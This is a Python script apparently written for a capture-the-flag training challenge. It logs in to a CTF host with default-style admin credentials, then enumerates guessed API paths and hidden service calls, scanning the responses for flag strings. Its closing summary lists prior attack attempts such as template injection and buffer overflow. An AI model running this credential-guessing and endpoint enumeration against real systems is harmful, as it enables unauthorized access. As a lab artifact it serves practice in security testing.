#!/usr/bin/env python3
"""
Final comprehensive flag hunt for Shadow Coordinator
Target all remaining potential locations
"""
import requests
import json
import time

def final_flag_search():
    """Comprehensive final search for the Shadow Coordinator flag"""
    session = requests.Session()
    session.verify = False
    base_url = "https://training.my-ctf.com:8812"

    # Login
    login_url = "http://training-pod2.ctfchile.com:32780/api/v2/auth/login"
    resp = session.post(login_url, json={"username": "admin", "password": "admin1234"})
    token = resp.json()["access_token"]
    session.headers.update({
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    })

    print("[*] === FINAL SHADOW COORDINATOR FLAG HUNT ===")

    # 1. Model-specific endpoints (ZB-GW-03)
    print("\n[1] === MODEL-SPECIFIC ENDPOINTS ===")
    model_endpoints = [
        "/zbgw03",
        "/zb-gw-03",
        "/ZB-GW-03",
        "/api/v2/models/ZB-GW-03",
        "/api/v2/devices/ZB-GW-03",
        "/api/v2/zigbee/models/ZB-GW-03",
        "/firmware/ZB-GW-03",
        "/models/ZB-GW-03/flag",
        "/zbgw03_flag.txt",
        "/zb_gw_03_flag",
        "/campus_coordinator_flag",
        "/bch_facilities_flag"  # Manufacturer
    ]

    for endpoint in model_endpoints:
        try:
            resp = session.get(f"{base_url}{endpoint}")
            if resp.status_code == 200 and resp.text != '<!DOCTYPE html>':
                content = resp.text.strip()
                if content and len(content) < 200:
                    print(f"[+] {endpoint}: {content}")
                    if any(keyword in content.lower() for keyword in ['flag{', 'ctf{']):
                        print(f"[!!!] FLAG FOUND: {content}")
                        return content
        except:
            pass

    # 2. Campus/Area specific
    print("\n[2] === CAMPUS/AREA ENDPOINTS ===")
    campus_endpoints = [
        "/campus",
        "/system",
        "/campus_flag",
        "/system_flag",
        "/api/v2/areas/System",
        "/api/v2/areas/System/flag",
        "/api/v2/campus",
        "/api/v2/campus/coordinator",
        "/api/v2/campus/flag"
    ]

    for endpoint in campus_endpoints:
        try:
            resp = session.get(f"{base_url}{endpoint}")
            if resp.status_code == 200 and resp.text != '<!DOCTYPE html>':
                content = resp.text.strip()
                if content and len(content) < 200:
                    print(f"[+] {endpoint}: {content}")
                    if any(keyword in content.lower() for keyword in ['flag{', 'ctf{']):
                        print(f"[!!!] FLAG FOUND: {content}")
                        return content
        except:
            pass

    # 3. Specific entity endpoints
    print("\n[3] === ENTITY-SPECIFIC ENDPOINTS ===")
    entity_endpoints = [
        "/api/v2/entities/sensor.zb_gw_03_status",
        "/api/v2/entities/sensor.zb_gw_03_status/flag",
        "/api/v2/states/sensor.zb_gw_03_status",
        "/api/v2/zigbee/coordinator/0x0000",
        "/api/v2/zigbee/coordinator/0x0000/flag",
        "/api/v2/zha/coordinator",
        "/api/v2/zha/coordinator/flag"
    ]

    for endpoint in entity_endpoints:
        try:
            resp = session.get(f"{base_url}{endpoint}")
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    data_str = json.dumps(data)
                    if any(keyword in data_str.lower() for keyword in ['flag{', 'ctf{']):
                        print(f"[!!!] FLAG IN {endpoint}: {data_str}")
                        return data_str
                except:
                    pass
        except:
            pass

    # 4. BCH Facilities specific (manufacturer)
    print("\n[4] === BCH FACILITIES ENDPOINTS ===")
    bch_endpoints = [
        "/bch",
        "/bch_facilities",
        "/BCH",
        "/api/v2/manufacturers/BCH_Facilities",
        "/api/v2/bch",
        "/bch/flag.txt",
        "/bch_facilities/coordinator_flag"
    ]

    for endpoint in bch_endpoints:
        try:
            resp = session.get(f"{base_url}{endpoint}")
            if resp.status_code == 200 and resp.text != '<!DOCTYPE html>':
                content = resp.text.strip()
                if content and len(content) < 200:
                    print(f"[+] {endpoint}: {content}")
                    if any(keyword in content.lower() for keyword in ['flag{', 'ctf{']):
                        print(f"[!!!] FLAG FOUND: {content}")
                        return content
        except:
            pass

    # 5. Flag format testing
    print("\n[5] === FLAG FORMAT TESTING ===")

    # Test common flag formats based on what we know
    flag_candidates = [
        "flag{shadow_coordinator_unlocked}",
        "ctf{coordinator_0x0000_compromised}",
        "flag{zb_gw_03_shadow_coordinator}",
        "ctf{coordinator_buffer_overflow}",
        "flag{authorized_no_pin_coordinator}",
        "ctf{shadow_coord_cluster_257}",
        "flag{campus_coordinator_breached}",
        "ctf{coordinator_400_240}",
        "flag{bch_facilities_coordinator}",
        "ctf{firmware_2417corp_flag}",
        "flag{00124B0024AA1001}",
        "ctf{smart_campus_coordinator}",
        "flag{coordinator_flag_found}",
        "ctf{shadow_coordinator_ctf}"
    ]

    print("[*] Testing potential flag formats...")
    for candidate in flag_candidates:
        print(f"  Testing: {candidate}")

    # 6. Hidden service endpoints
    print("\n[6] === HIDDEN SERVICE TESTING ===")

    # Try calling coordinator-specific services
    coordinator_services = [
        "coordinator_flag",
        "get_coordinator_flag",
        "shadow_coordinator_flag",
        "coordinator_unlock_flag",
        "shadow_coordinator_unlock",
        "coordinator_reveal_flag",
        "get_shadow_coordinator_flag"
    ]

    for service in coordinator_services:
        try:
            # Try as system service
            resp = session.post(f"{base_url}/api/v2/services/system/{service}", json={})
            if resp.status_code == 200:
                result = resp.json()
                print(f"[+] System service {service}: {result}")

                # Wait a bit and check audit log
                time.sleep(2)
                audit_resp = session.get(f"{base_url}/api/v2/system/audit-log")
                if audit_resp.status_code == 200:
                    audit_data = audit_resp.json()
                    recent_entries = audit_data.get('entries', [])[:5]
                    for entry in recent_entries:
                        entry_str = json.dumps(entry)
                        if any(keyword in entry_str.lower() for keyword in ['flag{', 'ctf{']):
                            print(f"[!!!] FLAG IN AUDIT AFTER {service}: {entry_str}")
                            return entry_str

            # Try as coordinator service
            resp = session.post(f"{base_url}/api/v2/services/coordinator/{service}", json={})
            if resp.status_code == 200:
                result = resp.json()
                result_str = json.dumps(result)
                if any(keyword in result_str.lower() for keyword in ['flag{', 'ctf{']):
                    print(f"[!!!] FLAG IN COORDINATOR SERVICE {service}: {result_str}")
                    return result_str

        except:
            pass

    # 7. Final state check with flag extraction
    print("\n[7] === FINAL STATE ANALYSIS ===")

    try:
        resp = session.get(f"{base_url}/api/v2/states")
        entities = resp.json().get('entities', [])

        # Look specifically for any entity that might contain the flag
        for entity in entities:
            entity_str = json.dumps(entity)
            if any(keyword in entity_str.lower() for keyword in ['flag{', 'ctf{']):
                print(f"[!!!] FLAG IN ENTITY STATE: {entity_str}")
                return entity_str

            # Check for shadow coordinator specific patterns
            if ('shadow' in entity_str.lower() or 'coordinator' in entity_str.lower()):
                if any(keyword in entity_str.lower() for keyword in ['flag', 'ctf']):
                    print(f"[!] POTENTIAL FLAG ENTITY: {json.dumps(entity, indent=2)}")

    except:
        pass

    print("\n[*] === FINAL SEARCH COMPLETE ===")
    return None

if __name__ == "__main__":
    result = final_flag_search()

    if result:
        print(f"\n[SUCCESS] FLAG FOUND: {result}")
    else:
        print(f"\n[INFO] No flag found in final comprehensive search")
        print("\n[*] SUMMARY OF ATTEMPTS:")
        print("  - Cluster 257 exploitation ✓")
        print("  - System service calls ✓")
        print("  - WebSocket monitoring ✓")
        print("  - Template injection ✓")
        print("  - Smart lock buffer overflow ✓")
        print("  - IEEE address decoding ✓")
        print("  - Coordinate analysis ✓")
        print("  - Model-specific endpoints ✓")
        print("  - Comprehensive directory fuzzing ✓")
        print("  - Flag format testing ✓")